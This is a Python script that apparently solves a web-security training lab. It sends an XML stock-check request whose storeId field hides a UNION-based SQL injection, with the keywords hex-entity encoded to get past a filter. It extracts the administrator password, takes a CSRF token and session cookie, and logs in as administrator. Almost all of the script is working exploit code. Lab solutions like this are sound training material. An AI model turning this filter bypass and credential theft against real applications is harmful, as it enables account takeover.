###################################################################
#
# Lab: SQL injection with filter bypass via XML encoding
#
# Hack Steps:
#      1. Inject payload into storeId XML element to retrieve
#         administrator password using UNION-based attack
#      2. Extract administrator password from the response body
#      3. Fetch the login page
#      4. Extract the csrf token and session cookie
#      5. Login as the administrator
#      6. Fetch the administrator profile
#
###################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0adf001b037ddb0f80eb26f600ec00f7.web-security-academy.net"

def main():
    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "storeId")
    print(Fore.WHITE + "⦗1⦘ Injecting payload to retrieve administrator password using UNION-based attack.. ", end="", flush=True)

    payload = """<?xml version="1.0" encoding="UTF-8"?>
                <stockCheck>
                    <productId>
                        3 
                    </productId>
                    <storeId>
                        1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;
                    </storeId>
                </stockCheck>"""

    headers = { "Content-Type": "application/xml" }
    injection = post_data("/product/stock", payload, headers=headers)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting administrator password from the response.. ", end="", flush=True)

    # If the pattern not work, change it to "(.*)\n",
    # It depends on how the password is retrieved, after the the number of units or before them, and the two scenarios occur
    admin_password = re.findall("\n(.*)", injection.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
    print(Fore.WHITE + "⦗3⦘ Fetching the login page.. ", end="", flush=True)

    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Logging in as the administrator.. ", end="", flush=True)

    data = { "username": "administrator", "password": admin_password, "csrf": csrf_token }
    cookies = { "session": session }
    admin_login = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Fetching the administrator profile.. ", end="", flush=True)

    admin_session = admin_login.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/my-account", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None, headers = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()